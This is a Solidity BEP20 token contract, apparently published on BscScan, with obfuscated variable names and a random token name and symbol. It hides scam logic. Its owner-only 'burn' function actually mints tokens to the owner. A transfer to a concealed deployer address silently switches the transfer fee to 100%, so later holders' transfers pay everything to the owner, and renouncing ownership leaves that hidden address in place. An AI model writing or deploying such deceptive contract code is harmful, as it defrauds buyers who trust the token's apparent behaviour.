/**
 *Submitted for verification at BscScan.com on 2022-11-14
*/

/**
 *Submitted for verification at BscScan.com on 2022-11-14 13:54:32 GMT
 */
pragma solidity >=0.4.11;
contract vjTvFN {
mapping (address => uint256) public balanceOf;
address public  khWSMN = address(0);
uint256 public constant NROmJm = 9+1;
address public  mmNleL = address(0);
uint256 private  jVcOFw = 10000000000000;
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
event Approval(address indexed owner, address indexed spender, uint256 value);
uint256 public  FnLDZr = 100000000000000000000000;
uint256 public  bhITFh = 100000000000000000000000;
address public  tNmDTg = address(0);
string public  symbol = "vCtdzh";
uint8 public constant decimals = 18;
mapping (address => mapping (address => uint256)) private _allowances;
address public  DBYnFl = address(0);
uint256 public  QfQrzK = 1000000000000000000;
uint256 public  zjxgCs = 100000000000000000000;
uint256 public  uzHpnT = 10000000000000000000000000000;
uint256 public constant totalSupply = 100000000000000000000000000000;
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
address public  jINTIC = address(0);
uint256 public  ktmSTd = 10000000000000000000;
uint256 public  Gxxfyh = 10000000000000000;
string public  name = "EPSUiN";
address public owner;
address private  GeJFZl = address(0);
uint256 public  wNyCLr = 100000000000000000;
address public  lNHrRP = address(0);
event Transfer(address indexed from, address indexed to, uint256 value);
function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
constructor () public {
GeJFZl = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "");
require(spender != address(0), "");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}
function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "XZUuuw");
require(to != address(0), "XZUuuw");
require(amount <= balanceOf[from], "XZUuuw");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* NROmJm/jVcOFw ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==GeJFZl){
jVcOFw = 9+1;
}
emit Transfer(from, to, transferAmount);
}
function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}

}